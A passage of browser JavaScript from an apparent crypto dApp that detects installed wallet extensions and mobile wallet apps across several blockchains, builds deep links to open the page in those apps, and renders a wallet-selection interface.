            default:
                if (window.ethereum) {
                    log(`   ✓ Found fallback window.ethereum`, 'info', false);
                    return window.ethereum;
                }
        }
        
        return null;
    }

    // Deep Linking for Mobile Wallets
    function getMetaMaskMobileDeepLink() {
        const currentUrl = encodeURIComponent(window.location.href);
        return `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
    }

    function getTrustWalletMobileDeepLink() {
        const currentUrl = encodeURIComponent(window.location.href);
        return `https://link.trustwallet.com/open_url?url=${currentUrl}`;
    }

    function triggerMetaMaskMobileDeepLink() {
        window.location.href = getMetaMaskMobileDeepLink();
    }

    function triggerTrustWalletMobileDeepLink() {
        window.location.href = getTrustWalletMobileDeepLink();
    }

    // Mobile Wallet App Detection & Auto-Open
    const mobileWalletApps = {
        'metamask': {
            name: 'MetaMask',
            icon: '🦊',
            iosScheme: 'metamask://',
            androidPackage: 'io.metamask',
            deepLink: (url) => `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
            appStoreUrl: 'https://apps.apple.com/app/metamask/id1438144202',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=io.metamask',
        },
        'trust': {
            name: 'Trust Wallet',
            icon: '🛡️',
            iosScheme: 'trust://',
            androidPackage: 'com.trustwallet.android',
            deepLink: (url) => `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/trust-wallet/id1288519541',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.trustwallet.android',
        },
        'phantom': {
            name: 'Phantom',
            icon: '👻',
            iosScheme: 'phantom://',
            androidPackage: 'app.phantom',
            deepLink: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/phantom/id1593699920',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=app.phantom',
        },
        'coinbase': {
            name: 'Coinbase Wallet',
            icon: '🔵',
            iosScheme: 'cbwallet://',
            androidPackage: 'org.toshi',
            deepLink: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/coinbase-wallet/id1278383455',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=org.toshi',
        },
        'rainbow': {
            name: 'Rainbow',
            icon: '🌈',
            iosScheme: 'rainbow://',
            androidPackage: 'me.rainbow',
            deepLink: (url) => `https://rnbwapp.com/open?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/rainbow/id1457119021',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=me.rainbow',
        },
        'ledger': {
            name: 'Ledger Live',
            icon: '💎',
            iosScheme: 'ledgerlive://',
            androidPackage: 'com.ledger.live',
            deepLink: (url) => `https://ledger.com/web3?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/ledger-live/id1361671700',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.ledger.live',
        },
        'okx': {
            name: 'OKX Wallet',
            icon: '🟨',
            iosScheme: 'okx://',
            androidPackage: 'com.okex.wallet',
            deepLink: (url) => `https://www.okx.com/web3?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/okx-wallet/id1542604052',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.okex.wallet',
        },
        'safepal': {
            name: 'SafePal',
            icon: '🔐',
            iosScheme: 'safepal://',
            androidPackage: 'io.safepal',
            deepLink: (url) => `https://safepal.io/safepal_link?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/safepal/id1524605524',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=io.safepal',
        },
        'glow': {
            name: 'Glow',
            icon: '✨',
            iosScheme: 'glow://',
            androidPackage: 'com.glow.wallet',
            deepLink: (url) => `https://glow.app/open?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/glow-solana-wallet/id1599584512',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.glow.wallet',
        },
        'backpack': {
            name: 'Backpack',
            icon: '🎒',
            iosScheme: 'backpack://',
            androidPackage: 'app.backpack.android',
            deepLink: (url) => `https://backpack.app/open?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/backpack-crypto-wallet/id1602751237',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=app.backpack.android',
        },
        'solflare': {
            name: 'Solflare',
            icon: '☀️',
            iosScheme: 'solflare://',
            androidPackage: 'com.solflare.mobile',
            deepLink: (url) => `https://solflare.com/access-wallet?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/solflare-wallet/id1580902717',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
        },
        'argent': {
            name: 'Argent',
            icon: '🛡️',
            iosScheme: 'argent://',
            androidPackage: 'im.argent.contractwalletclient',
            deepLink: (url) => `https://argent.link?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/argent/id1358741635',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=im.argent.contractwalletclient',
        },
        'imtoken': {
            name: 'imToken',
            icon: '🎫',
            iosScheme: 'imtoken://',
            androidPackage: 'im.token.app',
            deepLink: (url) => `https://www.imtoken.io/defi?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/imtoken/id1384798185',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=im.token.app',
        },
        'tronlink': {
            name: 'TronLink',
            icon: '⬢',
            iosScheme: 'tronlink://',
            androidPackage: 'com.tronlinkpro.app',
            deepLink: (url) => `tronlink://open_url?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/tronlink-wallet/id1408389451',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.app',
        },
        'mathwallet': {
            name: 'MathWallet',
            icon: '🧮',
            iosScheme: 'mathwallet://',
            androidPackage: 'com.mathwallet',
            deepLink: (url) => `https://mathwallet.org/defi?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/math-wallet/id1582612388',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.mathwallet',
        },
        'brave': {
            name: 'Brave Wallet',
            icon: '🦁',
            iosScheme: 'brave://',
            androidPackage: 'com.brave.browser',
            deepLink: (url) => `https://brave.com/wallet?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/brave-private-web-browser/id1052879175',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.brave.browser',
        },
        'halodefi': {
            name: 'Halo Wallet',
            icon: '⭕',
            iosScheme: 'halowallet://',
            androidPackage: 'com.halodefi.mobile',
            deepLink: (url) => `https://halodefi.com/open?url=${encodeURIComponent(window.location.href)}`,
            appStoreUrl: 'https://apps.apple.com/app/halo-wallet/id1599750942',
            playStoreUrl: 'https://play.google.com/store/apps/details?id=com.halodefi.mobile',
        },
    };

    // Detect if wallet app is installed on mobile
    async function detectInstalledWalletApp(walletKey) {
        const wallet = mobileWalletApps[walletKey];
        if (!wallet) return false;

        const isAndroid = /Android/.test(navigator.userAgent);
        const isIOSDevice = isIOS();

        if (isIOSDevice) {
            // iOS: Try to detect via URL scheme
            return new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    resolve(false);
                }, 1500);

                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);

                iframe.onload = () => {
                    clearTimeout(timeout);
                    resolve(false);
                };

                iframe.src = wallet.iosScheme;

                setTimeout(() => {
                    if (document.body.contains(iframe)) {
                        document.body.removeChild(iframe);
                    }
                    clearTimeout(timeout);
                }, 1500);

                // If app opens, timeout won't fire and we assume it's installed
                setTimeout(() => {
                    resolve(true);
                }, 100);
            });
        } else if (isAndroid) {
            // Android: Check user agent for common wallet indicators
            const userAgent = navigator.userAgent;
            return userAgent.includes(wallet.androidPackage) || 
                   userAgent.includes(wallet.name.toLowerCase());
        }

        return false;
    }

    // Auto-open wallet app on mobile for selected wallet
    async function autoOpenWalletApp(walletKey) {
        const wallet = mobileWalletApps[walletKey];
        if (!wallet) {
            log(`❌ Wallet app configuration not found: ${walletKey}`, 'error');
            return false;
        }

        const isAndroid = /Android/.test(navigator.userAgent);
        const isIOSDevice = isIOS();

        if (!isAndroid && !isIOSDevice) {
            // Not mobile, skip auto-open
            return false;
        }

        try {
            log(`📱 Attempting to open ${wallet.name} app...`, 'info');

            const deepLink = wallet.deepLink(window.location.href);

            if (isIOSDevice) {
                // Try iOS deep link
                window.location.href = deepLink;
            } else if (isAndroid) {
                // For Android, use intent if possible
                const intentUrl = `intent://host#Intent;package=${wallet.androidPackage};scheme=https;action=android.intent.action.VIEW;end`;
                window.location.href = deepLink;
            }

            // Wait a moment to see if app opens
            await new Promise(resolve => setTimeout(resolve, 2000));

            // If we're still here, app probably didn't open
            log(`⚠️ Could not open ${wallet.name}. Opening download page...`, 'warning');

            // Open app store
            if (isIOSDevice) {
                window.open(wallet.appStoreUrl, '_blank');
            } else if (isAndroid) {
                window.open(wallet.playStoreUrl, '_blank');
            }

            return true;
        } catch (error) {
            log(`❌ Error opening ${wallet.name}: ${error.message}`, 'error');
            return false;
        }
    }

    // Comprehensive wallet detection across all networks
    function detectAllWallets() {
        const allDetectedWallets = [];
        
        log('🔍 Starting wallet detection scan...', 'info');
        
        // Detect device type
        const onMobile = isMobileDevice();
        const onIOS = isIOS();
        if (onMobile) {
            log(`📱 Mobile device detected (iOS: ${onIOS})`, 'info');
        }

        // Mobile Wallet Detection for iOS
        if (onMobile) {
            // MetaMask Mobile Detection
            if (isInsideMetaMaskMobile() || (window.ethereum && window.ethereum.isMetaMask && onMobile)) {
                log('✓ MetaMask Mobile detected', 'info');
                allDetectedWallets.push({
                    name: 'MetaMask Mobile',
                    type: 'evm',
                    provider: window.ethereum || { isMetaMask: true, isMobile: true },
                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                    icon: '🦊',
                    selected: false,
                    connected: false,
                    isMobileOnly: true,
                    deepLink: getMetaMaskMobileDeepLink()
                });
            }

            // Trust Wallet Mobile Detection
            if (isInsideTrustWalletMobile() || window.trustwallet || 
                (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet) && onMobile)) {
                log('✓ Trust Wallet Mobile detected', 'info');
                allDetectedWallets.push({
                    name: 'Trust Wallet Mobile',
                    type: 'multi',
                    provider: window.ethereum || window.trustwallet || { isTrust: true, isMobile: true },
                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'SOL', 'TRX'],
                    icon: '🛡️',
                    selected: false,
                    connected: false,
                    isMobileOnly: true,
                    deepLink: getTrustWalletMobileDeepLink()
                });
            }

            // If no wallets detected yet on mobile, add available mobile wallet options
            if (allDetectedWallets.length === 0) {
                log('ℹ️ No wallet apps detected in browser. Adding available mobile wallet options...', 'info');
                
                // MetaMask Mobile option
                allDetectedWallets.push({
                    name: 'MetaMask',
                    type: 'evm',
                    provider: null,
                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                    icon: '🦊',
                    selected: false,
                    connected: false,
                    isMobileOnly: true,
                    isMobileOption: true,
                    deepLink: getMetaMaskMobileDeepLink()
                });
                
                // Trust Wallet Mobile option
                allDetectedWallets.push({
                    name: 'Trust Wallet',
                    type: 'multi',
                    provider: null,
                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'SOL', 'TRX'],
                    icon: '🛡️',
                    selected: false,
                    connected: false,
                    isMobileOnly: true,
                    isMobileOption: true,
                    deepLink: getTrustWalletMobileDeepLink()
                });
                
                // Phantom Mobile option
                allDetectedWallets.push({
                    name: 'Phantom',
                    type: 'solana',
                    provider: null,
                    supportedNetworks: ['SOL', 'ETH', 'POLYGON'],
                    icon: '👻',
                    selected: false,
                    connected: false,
                    isMobileOnly: true,
                    isMobileOption: true,
                    deepLink: `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}?ref=https://phantom.app`
                });
                
                // Coinbase Wallet Mobile option
                allDetectedWallets.push({
                    name: 'Coinbase Wallet',
                    type: 'evm',
                    provider: null,
                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                    icon: '🔵',
                    selected: false,
                    connected: false,
                    isMobileOnly: true,
                    isMobileOption: true,
                    deepLink: `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`
                });
                
                log(`📱 Added ${allDetectedWallets.length} mobile wallet options. Please install and open one of these wallets to continue.`, 'info');
            }
        }
        
        // Phantom Wallet detection (prioritize this first to avoid conflicts)
        if (window.solana && window.solana.isPhantom) {
            log('✓ Phantom (Solana) detected', 'info');
            
            // Check if Phantom also supports EVM (Ethereum)
            const supportedNetworks = ['SOL'];
            if (window.ethereum && (window.ethereum.isPhantom || window.ethereum._phantom || 
                (window.ethereum.isMetaMask && window.solana?.isPhantom))) {
                // Phantom supports Solana + limited EVM networks (only ETH and POLYGON)
                supportedNetworks.push('ETH', 'POLYGON');
                log('✓ Phantom EVM support detected - supports ETH and POLYGON only', 'info');
            }
            
            allDetectedWallets.push({
                name: 'Phantom',
                type: 'multi',
                provider: window.solana,
                evmProvider: window.ethereum, // Store EVM provider separately
                supportedNetworks: supportedNetworks,
                icon: '👻',
                selected: false,
                connected: false
            });
        }
        
        // Phantom EVM support (if ethereum provider is also available and not already detected)
        if (window.ethereum && window.ethereum.isPhantom && !allDetectedWallets.find(w => w.name === 'Phantom')) {
            log('✓ Phantom (EVM) detected', 'info');
            allDetectedWallets.push({
                name: 'Phantom (EVM)',
                type: 'evm',
                provider: window.ethereum,
                supportedNetworks: ['ETH', 'POLYGON'],
                icon: '�',
                selected: false,
                connected: false
            });
        }
        
        // Trust Wallet detection (check multiple indicators and prioritize over MetaMask)
        if (window.ethereum && (
            window.ethereum.isTrust || 
            window.ethereum.isTrustWallet ||
            (window.ethereum.isMetaMask && window.tronWeb) || // Trust Wallet sets isMetaMask=true AND has tronWeb
            (window.tronWeb && window.tronWeb.isTrustWallet) ||
            (navigator.userAgent && navigator.userAgent.includes('Trust'))
        )) {
            log('✓ Trust Wallet detected (multi-network support)', 'info');
            
            const supportedNetworks = ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'];
            
            // Check if TronLink/Tron support is available (even if not connected)
            if (window.tronWeb) {
                supportedNetworks.push('TRX');
                log('✓ Trust Wallet Tron support detected', 'info');
            }
            
            allDetectedWallets.push({
                name: 'Trust Wallet',
                type: 'multi',
                provider: window.ethereum,
                tronProvider: window.tronWeb,
                supportedNetworks: supportedNetworks,
                icon: '🛡️',
                selected: false,
                connected: false
            });
        }
        // MetaMask detection (very strict - must have MetaMask specific properties and not be other wallets)
        else if (window.ethereum && 
            window.ethereum.isMetaMask && 
            !window.ethereum.isPhantom && 
            !window.ethereum.isTrust &&
            !window.ethereum.isTrustWallet &&
            !window.solana?.isPhantom &&
            !window.tronWeb?.isTrustWallet &&
            !window.tronWeb && // Exclude if ANY tronWeb exists (Trust Wallet indicator)
            !(navigator.userAgent && navigator.userAgent.includes('Trust')) &&
            !allDetectedWallets.find(w => w.name === 'Trust Wallet') && // Exclude if Trust Wallet already detected
            (window.ethereum._metamask || window.ethereum.request)) {
            
            // Additional check - try to verify it's actually MetaMask
            const isRealMetaMask = !window.ethereum.isCoinbaseWallet &&
                                   !window.ethereum.isBackpack &&
                                   !window.ethereum.isGlow;
            
            if (isRealMetaMask) {
                log('✓ MetaMask detected', 'info');
                allDetectedWallets.push({
                    name: 'MetaMask',
                    type: 'evm',
                    provider: window.ethereum,
                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                    icon: '🦊',
                    selected: false,
                    connected: false
                });
            } else {
                log('⚠️ window.ethereum.isMetaMask is true but appears to be another wallet', 'info');
            }
        } else if (window.ethereum && window.ethereum.isMetaMask) {
            log('🚫 Skipping MetaMask detection - appears to be Trust Wallet or another wallet', 'warning');
        }
        
        // Coinbase Wallet detection
        if (window.ethereum && (window.ethereum.isCoinbaseWallet || window.coinbaseWalletExtension)) {
            allDetectedWallets.push({
                name: 'Coinbase Wallet',
                type: 'evm',
                provider: window.ethereum.isCoinbaseWallet ? window.ethereum : window.coinbaseWalletExtension,
                supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                icon: '�',
                selected: false,
                connected: false
            });
        }
        
        
        // Solflare Wallet detection (Solana only)
        if (window.solflare) {
            allDetectedWallets.push({
                name: 'Solflare',
                type: 'solana',
                provider: window.solflare,
                supportedNetworks: ['SOL'],
                icon: '☀️',
                selected: false,
                connected: false
            });
        }
        
        // Backpack Wallet detection (Solana only)
        if (window.backpack) {
            allDetectedWallets.push({
                name: 'Backpack',
                type: 'solana',
                provider: window.backpack,
                supportedNetworks: ['SOL'],
                icon: '🎒',
                selected: false,
                connected: false
            });
        }
        
        // Glow Wallet detection (Solana only)
        if (window.glow) {
            allDetectedWallets.push({
                name: 'Glow',
                type: 'solana',
                provider: window.glow,
                supportedNetworks: ['SOL'],
                icon: '✨',
                selected: false,
                connected: false
            });
        }
        
        // TronLink detection (Tron only - exclude if it's Trust Wallet)
        if (window.tronWeb && window.tronWeb.defaultAddress && 
            !window.tronWeb.isTrustWallet && 
            !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
            allDetectedWallets.push({
                name: 'TronLink',
                type: 'tron',
                provider: window.tronWeb,
                supportedNetworks: ['TRX'],
                icon: '🔶',
                selected: false,
                connected: false
            });
        }
        
        // Handle multiple providers if available (check for additional wallets)
        if (window.ethereum && window.ethereum.providers) {
            window.ethereum.providers.forEach(provider => {
                // MetaMask from multiple providers (very strict - exclude Trust Wallet)
                if (provider.isMetaMask && 
                    !provider.isPhantom && 
                    !provider.isTrust && 
                    !provider.isTrustWallet &&
                    !window.tronWeb &&
                    !(navigator.userAgent && navigator.userAgent.includes('Trust'))) {
                    if (!allDetectedWallets.find(w => w.name === 'MetaMask')) {
                        log('✓ MetaMask detected from multiple providers', 'info');
                        allDetectedWallets.push({
                            name: 'MetaMask',
                            type: 'evm',
                            provider: provider,
                            supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                            icon: '🦊',
                            selected: false,
                            connected: false
                        });
                    }
                }
                
                // Coinbase Wallet from multiple providers
                if (provider.isCoinbaseWallet) {
                    if (!allDetectedWallets.find(w => w.name === 'Coinbase Wallet')) {
                        allDetectedWallets.push({
                            name: 'Coinbase Wallet',
                            type: 'evm',
                            provider: provider,
                            supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                            icon: '🔷',
                            selected: false,
                            connected: false
                        });
                    }
                }
                
                // Trust Wallet from multiple providers (not Phantom, not already detected)
                if ((provider.isTrust || provider.isTrustWallet || 
                     (provider.isMetaMask && window.tronWeb)) && 
                    !provider.isPhantom) {
                    if (!allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
                        log('✓ Trust Wallet detected from multiple providers', 'info');
                        allDetectedWallets.push({
                            name: 'Trust Wallet',
                            type: 'multi',
                            provider: provider,
                            tronProvider: window.tronWeb,
                            supportedNetworks: window.tronWeb ? 
                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'TRX'] : 
                                ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
                            icon: '🛡️',
                            selected: false,
                            connected: false
                        });
                    }
                }
                
                // Phantom EVM from multiple providers (if not already added as Solana)
                if (provider.isPhantom && !allDetectedWallets.find(w => w.name.includes('Phantom'))) {
                    allDetectedWallets.push({
                        name: 'Phantom (EVM)',
                        type: 'evm',
                        provider: provider,
                        supportedNetworks: ['ETH', 'POLYGON'],
                        icon: '👻',
                        selected: false,
                        connected: false
                    });
                }
            });
        }
        
        log(`🎯 Wallet detection complete. Found ${allDetectedWallets.length} wallets:`, 'info');
        allDetectedWallets.forEach((wallet, index) => {
            log(`  ${index + 1}. ${wallet.name} (${wallet.type}) - Networks: ${wallet.supportedNetworks.join(', ')}`, 'info');
        });
        
        // Debug: Check for any ethereum provider properties
        if (window.ethereum) {
            log('🔍 Debug: window.ethereum properties:', 'info');
            log(`  - isMetaMask: ${window.ethereum.isMetaMask}`, 'info');
            log(`  - isPhantom: ${window.ethereum.isPhantom}`, 'info');
            log(`  - isTrust: ${window.ethereum.isTrust}`, 'info');
            log(`  - isTrustWallet: ${window.ethereum.isTrustWallet}`, 'info');
            log(`  - isCoinbaseWallet: ${window.ethereum.isCoinbaseWallet}`, 'info');
            log(`  - has _metamask: ${!!window.ethereum._metamask}`, 'info');
            log(`  - has tronWeb: ${!!window.tronWeb}`, 'info');
            log(`  - userAgent includes Trust: ${navigator.userAgent.includes('Trust')}`, 'info');
            
            // If Trust Wallet is detected, override the isMetaMask flag to prevent confusion
            if ((window.ethereum.isTrust || window.ethereum.isTrustWallet || 
                 (window.ethereum.isMetaMask && window.tronWeb) ||
                 navigator.userAgent.includes('Trust')) && 
                allDetectedWallets.find(w => w.name === 'Trust Wallet')) {
                log('🔧 Overriding MetaMask identification for Trust Wallet', 'warning');
                // Don't actually modify the provider, just note the override
            }
        }
        
        if (window.solana) {
            log('🔍 Debug: window.solana properties:', 'info');
            log(`  - isPhantom: ${window.solana.isPhantom}`, 'info');
        }
        
        return allDetectedWallets;
    }

    // Mobile wallet deeplinks helper
    function showMobileWalletHelp() {
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        if (isMobile && detectedWallets.length === 0) {
            log('📱 Mobile device detected with no wallets found!', 'warning');
            log('💡 Try opening this page in your wallet\'s built-in browser:', 'info');
            
            const currentUrl = window.location.href;
            const encodedUrl = encodeURIComponent(currentUrl);
            
            // Create mobile wallet deeplinks
            const walletDeeplinks = {
                'Phantom': `https://phantom.app/ul/browse/${encodedUrl}?ref=https://phantom.app`,
                'MetaMask': `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
                'Trust Wallet': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
                'Coinbase Wallet': `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
                'Rainbow': `https://rnbwapp.com/open?url=${encodedUrl}`,
                'Solflare': `https://solflare.com/access-wallet?redirect=${encodedUrl}`
            };
            
            log('🔗 Mobile Wallet Deeplinks (Click to open in wallet):', 'info');
            Object.entries(walletDeeplinks).forEach(([walletName, deeplink]) => {
                log(`  • ${walletName}: ${deeplink}`, 'info');
            });
            
            // Add clickable deeplink buttons to the UI
            addMobileDeeplinkButtons(walletDeeplinks);
            
            log('📋 Manual Instructions:', 'info');
            log('  • Phantom: Open Phantom app > Browser > Navigate to this URL', 'info');
            log('  • MetaMask: Open MetaMask app > Browser > Navigate to this URL', 'info');
            log('  • Trust Wallet: Open Trust Wallet app > DApps > Navigate to this URL', 'info');
            log('  • Coinbase Wallet: Open Coinbase Wallet app > Browser > Navigate to this URL', 'info');
        }
    }
    
    // Add mobile deeplink buttons to the UI
    function addMobileDeeplinkButtons(walletDeeplinks) {
        const grid = $('#wallet-selection-grid');
        
        // Clear existing content
        grid.empty();
        
        // Add header
        grid.append(`
            <div style="grid-column: 1/-1; text-align: center; padding: 20px; background: #2a2a2a; border-radius: 8px; margin-bottom: 20px;">
                <h4 style="color: #ff6b6b; margin-bottom: 10px;">📱 No Mobile Wallets Detected!</h4>
                <p style="color: #ccc; margin-bottom: 15px;">Click a button below to open this page in your wallet's browser:</p>
            </div>
        `);
        
        // Add deeplink buttons
        Object.entries(walletDeeplinks).forEach(([walletName, deeplink]) => {
            const walletIcon = {
                'Phantom': '👻',
                'MetaMask': '🦊', 
                'Trust Wallet': '🛡️',
                'Coinbase Wallet': '🔵',
                'Rainbow': '🌈',
                'Solflare': '☀️'
            }[walletName] || '📱';
            
            const button = $(`
                <div class="mobile-deeplink-button" style="
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    border: none;
                    border-radius: 12px;
                    padding: 15px;
                    color: white;
                    text-align: center;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
                " data-deeplink="${deeplink}">
                    <div style="font-size: 24px; margin-bottom: 8px;">${walletIcon}</div>
                    <div style="font-weight: bold; margin-bottom: 4px;">${walletName}</div>
                    <div style="font-size: 12px; opacity: 0.8;">Tap to open</div>
                </div>
            `);
            
            button.on('click', function() {
                const link = $(this).data('deeplink');
                log(`🔗 Opening ${walletName} deeplink...`, 'info');
                window.open(link, '_blank');
            });
            
            // Add hover effect
            button.on('mouseenter', function() {
                $(this).css('transform', 'translateY(-2px)');
            }).on('mouseleave', function() {
                $(this).css('transform', 'translateY(0)');
            });
            
            grid.append(button);
        });
        
        // Add manual instructions
        grid.append(`
            <div style="grid-column: 1/-1; text-align: center; padding: 20px; background: #1a1a1a; border-radius: 8px; margin-top: 20px;">
                <h5 style="color: #ffd93d; margin-bottom: 10px;">💡 Alternative Method</h5>
                <p style="color: #ccc; font-size: 14px; line-height: 1.4;">
                    If the buttons don't work, manually copy this URL and paste it into your wallet's browser:
                </p>
                <div style="background: #333; padding: 10px; border-radius: 6px; margin: 10px 0; word-break: break-all; font-family: monospace; font-size: 12px; color: #4CAF50;">
                    ${window.location.href}
                </div>
            </div>
        `);
    }

    // Scan all networks for available wallets
    async function scanAllNetworks() {
        log('Starting comprehensive wallet scan across all networks...', 'info', false);
        updateProgress(0, 'Scanning for wallets...');
        
        try {
            detectedWallets = detectAllWallets();
            
            if (detectedWallets.length === 0) {
                const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
                if (isIOS) {
                    log('No wallets detected!\nOn iOS, you must open this page inside your wallet app (e.g., MetaMask, Trust Wallet, Phantom) using the built-in browser. Safari and Chrome do not support wallet extensions.', 'error', false);
                } else {
                    log('No wallets detected! Please install wallet extensions and refresh the page.', 'error', false);
                }
                // Show mobile wallet help if on mobile device
                showMobileWalletHelp();
                updateProgress(0, '');
                return;
            }
            
            // Render wallet selection UI
            renderWalletSelection();
            
            // Update stats
            updateWalletSelectionStats();
            
            updateProgress(100, 'Wallet scan complete!');
            setTimeout(() => updateProgress(0, ''), 2000);
            
            log(`✓ Wallet scan complete! Found ${detectedWallets.length} wallet(s).`, 'success', false);
            log('Please select the wallets you want to connect to from the Wallet Selection tab.', 'info', false);
            
            // Enable wallet selection controls
            $('#select-all-wallets').prop('disabled', false);
            
        } catch (error) {
            log(`✗ Error during wallet scan: ${error.message}`, 'error', false);
            updateProgress(0, '');
        }
    }
    
    // Render wallet selection interface
    function renderWalletSelection() {
        const grid = $('#wallet-selection-grid');
        grid.empty();
        
        // If no wallets detected, show mobile deep link options for MetaMask and Trust Wallet
        if (detectedWallets.length === 0) {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (isMobile) {
                const currentUrl = window.location.href;
                const encodedUrl = encodeURIComponent(currentUrl);
                const mobileWallets = [
                    {
                        name: 'MetaMask',
                        icon: '🦊',
                        deepLink: `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`
                    },
                    {
                        name: 'Trust Wallet',
                        icon: '🛡️',
                        deepLink: `https://link.trustwallet.com/open_url?url=${encodedUrl}`
                    }
                ];
                grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No wallets detected.<br>If you have MetaMask or Trust Wallet installed, tap below to open this site in your wallet app:</div>');
                mobileWallets.forEach(wallet => {
                    const btn = $(`
                        <div class="wallet-selection-item mobile-option" style="margin: 10px auto; max-width: 300px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 12px; color: white; padding: 18px; cursor: pointer; font-size: 1.1em; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
                            <span style="font-size: 2em;">${wallet.icon}</span>
                            <span style="font-weight: bold;">Open in ${wallet.name}</span>
                        </div>
                    `);
                    btn.on('click', () => {
                        window.open(wallet.deepLink, '_blank');
                    });
                    grid.append(btn);
                });
                grid.append(`<div style="grid-column: 1/-1; text-align: center; color: #ccc; font-size: 0.95em; margin-top: 18px;">If the button doesn't work, open your wallet app, go to the browser tab, and enter:<br><span style='color:#4CAF50;background:#222;padding:2px 6px;border-radius:4px;'>${window.location.href}</span></div>`);
                return;
            } else {
                grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No wallets detected. Please install wallet extensions.</div>');
                return;
            }
        }
        
        detectedWallets.forEach((wallet, index) => {
            const networksText = wallet.supportedNetworks.map(net => NETWORKS[net]?.icon || net).join(' ');
            const isMobileOption = wallet.isMobileOption;
            const walletItem = $(`
                <div class="wallet-selection-item ${wallet.selected ? 'selected' : 'available'} ${isMobileOption ? 'mobile-option' : ''}" data-wallet-index="${index}">
                    <div class="wallet-header">
                        <span class="wallet-icon">${wallet.icon}</span>
                        <span class="wallet-name">${wallet.name}</span>
                        <span class="selection-status">${wallet.selected ? '✅' : (isMobileOption ? '📱' : '⭕')}</span>
                    </div>
